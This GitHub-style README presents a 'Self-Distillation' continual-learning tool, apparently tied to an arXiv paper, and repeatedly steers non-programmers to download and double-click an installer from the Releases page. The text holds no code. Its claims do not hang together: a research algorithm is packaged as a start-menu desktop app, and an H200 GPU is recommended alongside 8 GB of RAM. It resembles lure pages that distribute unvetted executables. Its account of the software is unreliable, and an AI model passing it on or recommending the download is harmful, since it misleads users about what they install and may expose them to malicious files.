# ğŸš€ Self-Distillation - Simplifying Continuous Learning

[![Download Self-Distillation](https://img.shields.io/badge/Download-Self--Distillation-blue.svg)](https://github.com/uthmandevsec/Self-Distillation/releases)

## ğŸ“– Overview

Self-Distillation is a tool designed to help models learn new skills without forgetting past knowledge. It builds on the On-Policy Self-Distillation algorithm from the research paper "[Self-Distillation Enables Continual Learning](https://arxiv.org/abs/2601.19897)". This software allows users to run effective experiments using just one H200 GPU.

## ğŸš€ Getting Started

In this guide, you will learn how to download and run Self-Distillation on your system. You do not need programming knowledge to follow these steps. 

### ğŸ› ï¸ System Requirements

- **Operating System:** Windows 10 or MacOS (Linux support is also available)
- **GPU:** H200 GPU recommended for best performance
- **Memory:** At least 8 GB of RAM
- **Storage:** Minimum of 1 GB free space for installation and data

## ğŸ“¥ Download & Install

To get started, you need to visit the Releases page and download the software.

[Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/releases)

Once you are on the Releases page:
1. Look for the latest version of Self-Distillation.
2. Locate the download link for your operating system.
3. Click the link to download the installation file.

### ğŸ“‚ Installing Self-Distillation

1. After downloading, locate the installation file on your computer. This file is usually in your "Downloads" folder.
2. Double-click the file to start the installation process.
3. Follow the on-screen instructions to complete the installation. This may include agreeing to terms and conditions and choosing an installation location.

## ğŸ› ï¸ Running Self-Distillation

Once the installation is complete, you can run the software.

1. Find the Self-Distillation application in your start menu or applications folder.
2. Click to open the application.
3. Use the interface to set up your experiments based on your preferences.

## ğŸ“š Using Self-Distillation

Self-Distillation allows you to conduct a variety of experiments focused on continual learning:

### ğŸŒŸ Key Features

- **Simple Configuration:** Easy setup for running experiments.
- **On-Policy Learning:** Helps your models learn directly from demonstrations.
- **Low Resource Usage:** Efficient enough to run on a single H200 GPU.

### ğŸ“Š Basic Experiment Setup

1. **Select Your Dataset:** Choose the dataset you want to work with from the options available in the application.
2. **Adjust Parameters:** Set the learning parameters based on your needs. The software provides default values that are suitable for most users.
3. **Run Your Experiment:** Press the "Start" button to begin the experiment.

### ğŸ” Monitoring Progress

While the experiment runs, you can monitor various metrics through the interface. This will help you understand how well your model is learning and if it needs adjustments.

## â“ Troubleshooting

If you encounter issues during installation or use, consider the following:

- **Installation Fails:** Ensure your operating system meets the above requirements. Verify that you downloaded the correct version.
- **Performance Issues:** If the application runs slowly, try closing other applications to free up memory.
- **Error Messages:** Refer to the user manual for explanations of common error messages. Support documentation is available on our [Wiki](https://github.com/uthmandevsec/Self-Distillation/wiki).

## ğŸŒ Additional Resources

For more guidance and advanced features, check out our documentation and community forums:

- [User Manual](https://github.com/uthmandevsec/Self-Distillation/wiki)
- [Community Forum](https://github.com/uthmandevsec/Self-Distillation/issues)

## ğŸ“ Support

If you need further assistance, please reach out to our support team. You can submit issues directly on GitHub or use our contact form on the website.

[Download Self-Distillation](https://github.com/uthmandevsec/Self-Distillation/releases) 

Start your journey in continual learning with Self-Distillation today!